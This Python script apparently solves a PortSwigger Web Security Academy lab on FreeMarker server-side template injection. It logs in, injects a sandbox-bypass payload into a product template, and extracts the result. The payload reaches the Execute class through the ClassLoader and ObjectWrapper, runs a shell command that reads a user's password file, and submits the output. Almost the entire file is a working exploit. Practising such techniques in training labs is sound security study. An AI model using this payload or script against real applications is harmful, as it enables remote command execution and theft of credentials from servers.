#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
SSTI in a sandboxed environment — FreeMarker sandbox bypass.

Bypasses FreeMarker's ?new() sandbox via ClassLoader → ObjectWrapper →
Execute to read /home/carlos/my_password.txt and submit the solution.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = """\
<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("cat /home/carlos/my_password.txt")}"""


def get_csrf(session: requests.Session, url: str) -> str:
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found")
    return m.group(1)


def login(session: requests.Session, lab: str, username: str, password: str) -> None:
    csrf = get_csrf(session, f"{lab}/login")
    r = session.post(f"{lab}/login", data={"csrf": csrf, "username": username, "password": password})
    if "Invalid username" in r.text or r.url.endswith("/login"):
        raise SystemExit("[-] Login failed")
    print(f"[*] Logged in as {username}")


def find_product_id(session: requests.Session, lab: str) -> str:
    r = session.get(f"{lab}/")
    m = re.search(r'productId=(\d+)', r.text)
    if not m:
        raise SystemExit("[-] No product found")
    return m.group(1)


def get_template(session: requests.Session, lab: str, product_id: str) -> tuple[str, str]:
    r = session.get(f"{lab}/product/template?productId={product_id}")
    csrf = re.search(r'name="csrf" value="([^"]+)"', r.text)
    template = re.search(r'<textarea[^>]*>(.*?)</textarea>', r.text, re.DOTALL)
    if not csrf or not template:
        raise SystemExit("[-] Could not extract template or CSRF")
    return csrf.group(1), template.group(1)


def save_template(session: requests.Session, lab: str, product_id: str, csrf: str, body: str) -> str:
    r = session.post(
        f"{lab}/product/template?productId={product_id}",
        data={"csrf": csrf, "template": body, "unlockToken": ""}
    )
    return r.text


def get_product_page(session: requests.Session, lab: str, product_id: str) -> str:
    r = session.get(f"{lab}/product?productId={product_id}")
    return r.text


def submit_solution(session: requests.Session, lab: str, answer: str) -> None:
    r = session.post(f"{lab}/submitSolution", data={"answer": answer})
    if "Congratulations" in r.text or r.status_code == 200:
        print("[+] Solution submitted successfully")
    else:
        print(f"[-] Submission status: {r.status_code}")


def main():
    parser = argparse.ArgumentParser(
        description="Solve SSTI Lab 6 (FreeMarker sandboxed)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--username", default="content-manager")
    parser.add_argument("--password", default="C0nt3ntM4n4g3r")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    login(s, lab, args.username, args.password)

    pid = find_product_id(s, lab)
    print(f"[*] Using product ID: {pid}")

    csrf, original = get_template(s, lab, pid)
    injected = original + "\n" + PAYLOAD
    print("[*] Injecting sandbox-bypass payload...")
    save_template(s, lab, pid, csrf, injected)

    page = get_product_page(s, lab, pid)
    # Password is a short alphanumeric string rendered by Execute's stdout
    m = re.search(r'([a-zA-Z0-9]{8,})', page[page.rfind("</p>"):])
    if not m:
        print("[-] Could not auto-extract password — check the product page")
        return

    password = m.group(1)
    print(f"[+] Password: {password}")
    submit_solution(s, lab, password)
    print("[+] Lab solved.")


if __name__ == "__main__":
    main()
